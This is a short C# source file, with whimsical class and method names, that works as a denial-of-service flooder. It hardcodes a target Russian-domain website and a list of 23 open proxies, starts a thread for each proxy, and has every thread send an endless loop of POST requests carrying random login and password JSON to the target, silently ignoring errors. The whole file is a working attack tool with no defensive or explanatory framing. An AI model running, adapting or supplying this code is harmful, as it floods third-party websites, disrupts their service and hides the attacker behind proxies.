using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Threading;

namespace Batterfly
{
    internal class Unicorn
    {
        private const string site = "http://www.xn---63-5cdblera7ati0efb4a9s.xn--p1ai/";
        private readonly List<string> list;
        private readonly List<Thread> threads = new List<Thread>(23);

        public Unicorn()
        {
            list = new List<string>
            {
                "http://193.239.103.19:34415",
                "http://185.183.185.175:8080",
                "http://178.215.190.239:48049",
                "http://150.66.2.146:80",
                "http://185.57.164.167:80",
                "http://168.70.26.227:8197",
                "http://45.237.182.98:8080",
                "http://212.200.27.134:8080",
                "http://89.102.2.149:8080",
                "http://124.41.240.43:50020",
                "http://194.167.44.91:80",
                "http://146.88.51.237:80",
                "http://183.91.33.41:8090",
                "http://183.91.33.41:8085",
                "http://183.91.33.41:90",
                "http://183.91.33.41:83",
                "http://183.91.33.42:92	",
                "http://183.91.33.42:88",
                "http://37.230.74.54:8080",
                "http://5.196.132.114:3128	",
                "http://41.190.33.162:8080",
                "http://178.128.151.27:80",
                "http://120.132.52.33:8888",
            };
            list.ForEach(Rainbow);
        }

        private void Rainbow(string address)
        {
            Thread thread = new Thread(Pony);
            threads.Add(thread);
            thread.Start(address);
        }

        public class Panda
        {
            public string login { get; set; }
            public string password { get; set; }
        }

        private void Pony(object obj)
        {
            var address = obj as string;

            HttpContent panda = new StringContent(JsonConvert.SerializeObject(new Panda { login = Guid.NewGuid().ToString(), password = Guid.NewGuid().ToString() }));
            HttpClientHandler handler = new HttpClientHandler
            {
                Proxy = new WebProxy(address)
            };
            HttpClient client = new HttpClient(handler);
            while (true)
            {
                try
                {
                    client.PostAsync(site, panda).ContinueWith(_ => { });
                }
                catch { }
            }
        }
    }
}
